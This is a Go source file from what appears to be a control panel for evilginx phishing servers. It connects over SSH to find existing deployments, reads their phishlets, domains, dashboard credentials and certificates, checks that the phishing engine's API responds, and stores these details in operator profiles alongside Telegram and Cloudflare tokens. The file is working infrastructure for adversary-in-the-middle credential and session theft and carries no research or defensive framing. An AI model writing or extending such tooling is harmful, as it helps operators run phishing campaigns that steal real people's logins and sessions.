package main

import (
	"encoding/json"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"
)

// Discovery is the result of scanning a server for an existing deployment.
type Discovery struct {
	Found          bool     `json:"found"`
	InstallDir     string   `json:"install_dir"`
	Binary         string   `json:"binary"`
	Version        string   `json:"version"`
	ServiceActive  string   `json:"service_active"`
	ServiceEnabled string   `json:"service_enabled"`
	UnitPath       string   `json:"unit_path"`
	Domain         string   `json:"domain"`
	Phishlet       string   `json:"phishlet"`
	Phishlets      []string `json:"phishlets"`
	DashboardSub   string   `json:"dashboard_sub"`
	DashboardUser  string   `json:"dashboard_user"`
	DashboardPass  string   `json:"dashboard_pass"`
	EngineURL      string   `json:"engine_url"`
	EngineOK       bool     `json:"engine_ok"`
	Ports          string   `json:"ports"`
	CertSubject    string   `json:"cert_subject"`
	CertExpiry     string   `json:"cert_expiry"`
	ConfigPath     string   `json:"config_path"`
	Notes          []string `json:"notes"`
	Error          string   `json:"error"`
}

// classifySSH turns ssh/net errors into actionable messages.
func classifySSH(err error) string {
	if err == nil {
		return ""
	}
	m := err.Error()
	switch {
	case strings.Contains(m, "host key mismatch") || strings.Contains(m, "knownhosts"):
		return "SSH host key does not match the pinned one. If the VPS was rebuilt, clear the pinned key and reconnect.\n" + m
	case strings.Contains(m, "unable to authenticate"), strings.Contains(m, "no supported methods"), strings.Contains(m, "permission denied"):
		return "SSH authentication failed — check the username, password or key file.\n" + m
	case strings.Contains(m, "connection refused"):
		return "Connection refused — is sshd running on that host/port?\n" + m
	case strings.Contains(m, "i/o timeout"), strings.Contains(m, "handshake failed"):
		return "No SSH response — the port is filtered, or sshd is at MaxStartups (too many pending connections). Try again in a minute.\n" + m
	case strings.Contains(m, "no such host"), strings.Contains(m, "lookup"):
		return "Host does not resolve — check the address.\n" + m
	}
	return m
}

var unitExecRe = regexp.MustCompile(`ExecStart=(\S+)`)
var dirFlagRe = regexp.MustCompile(`(?:^|\s)-c\s+(\S+)`)
var phishletsFlagRe = regexp.MustCompile(`(?:^|\s)-p\s+(\S+)`)

// Discover scans the server for an evil-pro / evilginx deployment without
// changing anything. It tolerates older layouts and non-standard install dirs.
func (a *App) Discover(p *Profile) *Discovery {
	d := &Discovery{}
	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
	if err != nil {
		d.Error = classifySSH(err)
		return d
	}
	defer c.Close()

	// 1. systemd unit -> install dir + flags
	if out, err := c.Run("systemctl cat evilginx 2>/dev/null | grep -E '^(ExecStart|WorkingDirectory)='"); err == nil && strings.TrimSpace(out) != "" {
		if m := unitExecRe.FindStringSubmatch(out); len(m) == 2 {
			d.Binary = m[1]
			dir := m[1]
			if i := strings.LastIndex(dir, "/"); i > 0 {
				dir = dir[:i] // .../build/evilginx -> .../build
			}
			if strings.HasSuffix(dir, "/build") {
				dir = dir[:len(dir)-len("/build")]
			}
			d.InstallDir = dir
		}
		if m := dirFlagRe.FindStringSubmatch(out); len(m) == 2 {
			if i := strings.LastIndex(m[1], "/"); i > 0 {
				cfgDir := m[1]
				if strings.HasSuffix(cfgDir, "/cfg") {
					cfgDir = cfgDir[:len(cfgDir)-len("/cfg")]
				}
				if d.InstallDir == "" {
					d.InstallDir = cfgDir
				}
				d.ConfigPath = m[1] + "/config.json"
			}
		}
		d.UnitPath = "/etc/systemd/system/evilginx.service"
	}

	// 2. fall back to well-known locations
	for _, cand := range []string{"/root/evilginx2", "/opt/evilginx2", "/opt/evilginx", "/srv/evilginx2"} {
		if d.InstallDir != "" {
			break
		}
		if _, err := c.Run("test -d " + shq(cand) + "/cfg"); err == nil {
			d.InstallDir = cand
		}
	}
	if d.InstallDir == "" {
		if out, _ := c.Run("command -v evilginx"); strings.TrimSpace(out) != "" {
			bin := strings.TrimSpace(out)
			if i := strings.LastIndex(bin, "/"); i > 0 {
				d.Binary = bin
				d.InstallDir = bin[:i]
			}
		}
	}
	if d.InstallDir == "" {
		d.Error = "no evil-pro / evilginx deployment found on this server"
		return d
	}
	if d.ConfigPath == "" {
		d.ConfigPath = d.InstallDir + "/cfg/config.json"
	}
	if d.Binary == "" {
		d.Binary = d.InstallDir + "/build/evilginx"
	}
	d.Found = true

	// 3. service state
	if out, _ := c.Run("systemctl is-active evilginx 2>/dev/null"); strings.TrimSpace(out) != "" {
		d.ServiceActive = strings.TrimSpace(out)
	}
	if out, _ := c.Run("systemctl is-enabled evilginx 2>/dev/null"); strings.TrimSpace(out) != "" {
		d.ServiceEnabled = strings.TrimSpace(out)
	}
	if out, _ := c.Run(d.Binary + " -v 2>/dev/null | head -1"); strings.TrimSpace(out) != "" {
		d.Version = strings.TrimSpace(out)
	}
	if out, _ := c.Run("ss -tlnp 2>/dev/null | grep -oE ':(80|443|5000) ' | sort -u | tr '\\n' ' '"); out != "" {
		d.Ports = strings.TrimSpace(out)
	}

	// 4. config
	if raw, err := c.ReadFile(d.ConfigPath); err == nil {
		var m map[string]interface{}
		if json.Unmarshal(raw, &m) == nil {
			if g, ok := m["general"].(map[string]interface{}); ok {
				d.Domain, _ = g["domain"].(string)
				d.DashboardSub, _ = g["dashboard_sub"].(string)
				d.DashboardUser, _ = g["dashboard_user"].(string)
				d.DashboardPass, _ = g["dashboard_pass"].(string)
			}
			if ph, ok := m["phishlets"].(map[string]interface{}); ok {
				for name, v := range ph {
					d.Phishlets = append(d.Phishlets, name)
					if cfg, ok := v.(map[string]interface{}); ok {
						if en, _ := cfg["enabled"].(bool); en && d.Phishlet == "" {
							d.Phishlet = name
						}
					}
				}
			}
		}
	}
	if d.DashboardUser == "" {
		d.DashboardUser = "admin"
	}
	if d.DashboardSub == "" {
		d.DashboardSub = "panel"
	}
	if d.Phishlet == "" && len(d.Phishlets) > 0 {
		d.Phishlet = d.Phishlets[0]
	}

	// 5. certificate info
	cert := d.InstallDir + "/cfg/crt/wildcard/fullchain.pem"
	if out, err := c.Run("test -f " + shq(cert) + " && openssl x509 -in " + shq(cert) + " -noout -subject -enddate 2>/dev/null"); err == nil {
		for _, line := range strings.Split(out, "\n") {
			if strings.HasPrefix(line, "subject=") {
				d.CertSubject = strings.TrimPrefix(strings.TrimSpace(line), "subject=")
			}
			if strings.HasPrefix(line, "notAfter=") {
				d.CertExpiry = strings.TrimPrefix(strings.TrimSpace(line), "notAfter=")
			}
		}
	}

	// 6. can this panel reach the engine API?
	httpsURL := ""
	if d.Domain != "" {
		httpsURL = "https://" + d.DashboardSub + "." + d.Domain
	}
	d.EngineURL = "http://" + p.Host + ":5000"
	if d.Domain != "" {
		d.EngineURL = httpsURL
	}
	// prefer whatever actually answers
	for _, u := range []string{"http://" + p.Host + ":5000", httpsURL} {
		if u == "" {
			continue
		}
		if engineReachable(u, d.DashboardUser, d.DashboardPass) {
			d.EngineURL = u
			d.EngineOK = true
			break
		}
	}

	if d.ServiceActive != "active" {
		d.Notes = append(d.Notes, "service is "+orDefault(d.ServiceActive, "unknown")+" (not started)")
	}
	if d.Domain == "" {
		d.Notes = append(d.Notes, "config has no domain set")
	}
	if !d.EngineOK {
		d.Notes = append(d.Notes, "engine API not reachable from the panel on :5000 or "+httpsURL+
			" — the firewall may block it. Manage will still work once reachable.")
	}
	if d.DashboardPass == "" {
		d.Notes = append(d.Notes, "dashboard password is empty (login is open)")
	}
	return d
}

func engineReachable(base, user, pass string) bool {
	if base == "" {
		return false
	}
	client := &http.Client{Timeout: 6 * time.Second}
	req, err := http.NewRequest("GET", strings.TrimRight(base, "/")+"/api/v1/me", nil)
	if err != nil {
		return false
	}
	if user != "" || pass != "" {
		req.SetBasicAuth(user, pass)
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

func (a *App) handleDiscover(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	d := a.Discover(p)
	if d.Error != "" && !d.Found {
		a.store.Update(p.ID, func(pp *Profile) { pp.LastStatus = "unreachable"; pp.LastError = d.Error })
	}
	if d.Found {
		a.store.Update(p.ID, func(pp *Profile) { pp.LastStatus = "existing deployment found"; pp.LastError = ""; pp.LastSeen = time.Now().Unix() })
	}
	writeJSON(w, 200, d)
}

// handleAdopt copies discovered settings into the profile (no server changes).
func (a *App) handleAdopt(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	var d Discovery
	if err := json.NewDecoder(r.Body).Decode(&d); err != nil && err != io.EOF {
		jsonErr(w, 400, "invalid body")
		return
	}
	if !d.Found {
		d = *a.Discover(p)
	}
	if !d.Found {
		jsonErr(w, 400, orDefault(d.Error, "nothing to adopt"))
		return
	}
	updated, err := a.store.Upsert(&Profile{
		ID: p.ID, Name: p.Name,
		Host: p.Host, Port: p.Port, User: p.User,
		AuthType: p.AuthType, Password: p.Password, KeyPath: p.KeyPath, KeyPassphrase: p.KeyPassphrase,
		HostKeyFP:  p.HostKeyFP,
		InstallDir: orDefault(d.InstallDir, p.InstallDir),
		Domain:     orDefault(d.Domain, p.Domain),
		Phishlet:   orDefault(d.Phishlet, p.Phishlet),
		DashboardSub:  orDefault(d.DashboardSub, p.DashboardSub),
		DashboardUser: orDefault(d.DashboardUser, p.DashboardUser),
		DashboardPass: orDefault(d.DashboardPass, p.DashboardPass),
		Debug:         p.Debug, EngineURL: orDefault(d.EngineURL, p.EngineURL),
		TelegramToken: p.TelegramToken, TelegramChat: p.TelegramChat,
		CFToken: p.CFToken, CFZoneID: p.CFZoneID, CertEmail: p.CertEmail, UseWildcard: p.UseWildcard,
		Notes:      p.Notes,
		LastStatus: orDefault(d.ServiceActive, "adopted"), LastSeen: time.Now().Unix(), Version: d.Version,
	})
	if err != nil {
		jsonErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, updated)
}

// handleResetHostKey clears the pinned SSH host key.
func (a *App) handleResetHostKey(w http.ResponseWriter, r *http.Request) {
	p := a.store.Get(r.PathValue("id"))
	if p == nil {
		jsonErr(w, 404, "profile not found")
		return
	}
	a.store.Update(p.ID, func(pp *Profile) { pp.HostKeyFP = "" })
	writeJSON(w, 200, map[string]string{"status": "cleared"})
}

// syncCredsFromServer reads the engine's dashboard credentials/domain into the
// profile when they are missing or wrong, so Manage works after a reconnect.
func (a *App) syncCredsFromServer(p *Profile) {
	c, err := dial(p, nil)
	if err != nil {
		return
	}
	defer c.Close()
	cfg := orDefault(p.InstallDir, "/root/evilginx2") + "/cfg/config.json"
	raw, err := c.ReadFile(cfg)
	if err != nil {
		return
	}
	var m map[string]interface{}
	if json.Unmarshal(raw, &m) != nil {
		return
	}
	g, _ := m["general"].(map[string]interface{})
	if g == nil {
		return
	}
	a.store.Update(p.ID, func(pp *Profile) {
		if dom, _ := g["domain"].(string); dom != "" && pp.Domain == "" {
			pp.Domain = dom
		}
		if u, _ := g["dashboard_user"].(string); u != "" {
			pp.DashboardUser = u
		}
		if pw, _ := g["dashboard_pass"].(string); pw != "" {
			pp.DashboardPass = pw
		}
		if sub, _ := g["dashboard_sub"].(string); sub != "" {
			pp.DashboardSub = sub
		}
		if pp.EngineURL == "" {
			if pp.Domain != "" {
				pp.EngineURL = "https://" + pp.DashboardSub + "." + pp.Domain
			} else {
				pp.EngineURL = "http://" + pp.Host + ":5000"
			}
		}
	})
}

// orDefault is defined in main.go.

// ---------------------------------------------------------------------------
// handlers
// ---------------------------------------------------------------------------
